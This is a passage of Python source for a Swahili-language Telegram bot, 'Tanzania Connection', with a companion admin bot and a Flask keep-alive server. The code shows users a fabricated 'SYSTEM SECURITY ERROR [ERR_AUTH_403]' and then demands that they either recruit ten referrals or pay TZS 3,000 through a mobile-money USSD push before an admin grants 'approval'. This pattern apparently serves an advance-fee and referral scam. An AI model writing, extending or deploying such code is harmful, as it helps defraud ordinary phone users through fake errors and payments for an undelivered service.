                f"🚫 <b>BADO HUJATIMIZA REFERRAL 10.</b>\n👥 Waliojiunga: <code>{ref_count}/10</code>",
                parse_mode="HTML"
            )
        else:
            await query.message.reply_text(
                "🎉 <b>HONGERA!</b>\n\n✅ UMEKAMILISHA VERIFICATION YA PILI!\nTafadhali wasiliana na Admin wetu @Aishasmith0 na utume neno <b>APPROVAL</b> kupata kibali chako cha kuunganishwa.",
                parse_mode="HTML"
            )
    elif query.data == "activation3":
        await query.message.edit_text(
            "💳 <b>ACTIVATION YA HARAKA - TZS 3,000</b>\n\n"
            "Tafadhali weka namba yako ya simu ya mtandao (M-Pesa, TigoPesa, AirtelMoney) ili mfumo ukututumie ombi la malipo moja kwa moja (USSD Push).\n\n"
            "Andika namba yako hapa chini (mfano: 0712345678):",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 RUDI", callback_data="back_to_error")]
            ])
        )
        return WAITING_PHONE
    elif query.data == "back_to_error":
        await query.message.edit_text(
            "🛑 <b>SYSTEM SECURITY ERROR [ERR_AUTH_403]</b> 🛑\n\nChagua njia ya activation hapa chini 👇",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("✅ ACTIVATION 1", callback_data="activation1"),
                    InlineKeyboardButton("✅ ACTIVATION 2", callback_data="activation2")
                ],
                [InlineKeyboardButton("ACTIVATION 3", callback_data="activation3")],
                [InlineKeyboardButton("🔙 RUDI", callback_data="back")]
            ])
        )
    elif query.data == "back" or query.data == "back_to_regions":
        await query.message.reply_text("⬅️ Chagua mkoa wako hapa chini:", reply_markup=get_region_keyboard())

async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    # If user clicks/types a region name instead of phone while in state, cancel conversation and show region profile
    if text in REGIONS:
        await update.message.reply_text("⬅️ Umerudi kwenye mkoa.")
        return ConversationHandler.END

    user_id = str(update.effective_user.id)
    phone = text

    if not phone.startswith("0") or len(phone) < 10:
        await update.message.reply_text("❌ Namba si sahihi. Weka namba sahihi ya simu (mfano: 0712345678) au tuma /cancel kusitisha:")
        return WAITING_PHONE

    status_msg = await update.message.reply_text("⏳ Inatuma ombi la USSD Push kwenye simu yako...")

    try:
        response = requests.post(
            f"{HARAKAPAY_BASE_URL}/api/v1/collect",
            json={
                "phone": phone,
                "amount": 3000,
                "description": "Connection Activation Fee"
            },
            headers={
                "Content-Type": "application/json",
                "X-API-Key": HARAKAPAY_API_KEY
            },
            timeout=15
        )
        res_data = response.json()

        if res_data.get("success"):
            order_id = res_data.get("order_id")
            save_order(order_id, user_id, phone, 3000, "pending")
            await status_msg.edit_text(
                f"📱 <b>USSD PUSH IMETUMWA!</b>\n\n"
                f"Weka PIN kwenye simu yako kulipia TZS 3,000.\n"
                f"Order ID: <code>{order_id}</code>\n\n"
                f"Ukimaliza, wasiliana na Admin @Aishasmith0 na utume neno <b>APPROVAL</b> pamoja na Order ID hii.",
                parse_mode="HTML"
            )
        else:
            await status_msg.edit_text(f"❌ Imeshindikana: {res_data.get('error', 'Jaribu tena baadaye.')}")
    except Exception:
        await status_msg.edit_text("❌ Hitilafu ya kimtandao wakati wa kuunganishwa na HarakaPay.")

    return ConversationHandler.END

async def cancel_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Imesitishwa.", reply_markup=get_region_keyboard())
    return ConversationHandler.END


# --- UPGRADED INTERACTIVE ADMIN BOT (@connectiontzzadminbot) ---
async def admin_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        return
    await update.message.reply_text(
        "👑 <b>Tanzania Connection - Master Admin Panel</b>\n\n"
        "Chagua kitufe unachotaka kusimamia hapa chini:",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📊 Angalia Takwimu & Salio", callback_data="admin_stats")],
            [InlineKeyboardButton("📢 Tuma Tangazo (Broadcast)", callback_data="admin_broadcast_prompt")]
        ])
    )

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if str(query.from_user.id) != ADMIN_ID:
        return
    await query.answer()

    if query.data == "admin_stats":
        total_users = get_total_users_count()
        wallet_bal = 0
        try:
            res = requests.get(f"{HARAKAPAY_BASE_URL}/api/v1/balance", headers={"X-API-Key": HARAKAPAY_API_KEY}, timeout=10).json()
            if res.get("success"):
                wallet_bal = res.get("wallet_balance", 0)
        except Exception:
            pass

        await query.message.edit_text(
            f"📊 <b>SYSTEM STATISTICS & WALLET</b>\n\n"
            f"👥 Total Users: <code>{total_users}</code>\n"
            f"💰 HarakaPay Wallet: <code>TZS {wallet_bal}</code>\n\n"
            f"Bonyeza /start kurudi kwenye menyu kuu.",
            parse_mode="HTML"
        )
    elif query.data == "admin_broadcast_prompt":
        await query.message.edit_text(
            "📢 <b>MATANGAZO (BROADCAST)</b>\n\n"
            "Tuma ujumbe wako kwa kuandika amri hii:\n"
            "<code>/broadcast Ujumbe wako hapa...</code>",
            parse_mode="HTML"
        )

async def admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE, main_app):
    if str(update.effective_user.id) != ADMIN_ID:
        return
    
    text = " ".join(context.args)
    if not text and not update.message.reply_to_message:
        await update.message.reply_text("⚠️ Andika ujumbe wa broadcast au reply kwenye picha!")
        return

    users = get_all_users()
    success = 0
    failed = 0

    status_msg = await update.message.reply_text(f"🚀 Inatuma kwa watumiaji {len(users)}...")

    for uid in users:
        try:
            if update.message.reply_to_message:
                await main_app.bot.copy_message(chat_id=uid, from_chat_id=update.effective_chat.id, message_id=update.message.reply_to_message.message_id)
            else:
                await main_app.bot.send_message(chat_id=uid, text=text, parse_mode="HTML")
            success += 1
            await asyncio.sleep(0.05)
        except Exception:
            failed += 1

    await status_msg.edit_text(f"✅ Imekamilika!\n\nImetumika: {success}\nImeshindikana: {failed}")


# --- FLASK WEB SERVER ---
app = Flask(__name__)

@app.route('/')
def home():
    return "Connection Bot Upgraded & Running 24/7!"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)

# --- UNIFIED ASYNC MAIN RUNNER ---
async def main():
    init_db()

    flask_thread = Thread(target=run_flask, daemon=True)
    flask_thread.start()

    main_app = ApplicationBuilder().token(MAIN_BOT_TOKEN).build()
    admin_app = ApplicationBuilder().token(ADMIN_BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(handle_callback, pattern="^activation3$")],
        states={
            WAITING_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_phone)]
        },
        fallbacks=[CommandHandler("cancel", cancel_phone)]
    )

    # Main Bot Handlers
    main_app.add_handler(CommandHandler("start", start))
    main_app.add_handler(CallbackQueryHandler(age_callback, pattern="^age_"))
    main_app.add_handler(conv_handler)
    main_app.add_handler(CallbackQueryHandler(handle_callback))
    main_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, region_click))

    # Admin Bot Handlers
    admin_app.add_handler(CommandHandler("start", admin_start))
    admin_app.add_handler(CallbackQueryHandler(admin_callback))
    admin_app.add_handler(CommandHandler("broadcast", lambda u, c: admin_broadcast(u, c, main_app)))

    await main_app.initialize()
    await admin_app.initialize()
    await main_app.start()
    await admin_app.start()

    await main_app.updater.start_polling()
    await admin_app.updater.start_polling()

    print("🤖 Upgraded Main Bot & Interactive Admin Bot running successfully!")

    stop_event = asyncio.Event()
    await stop_event.wait()

if __name__ == "__main__":
    asyncio.run(main())
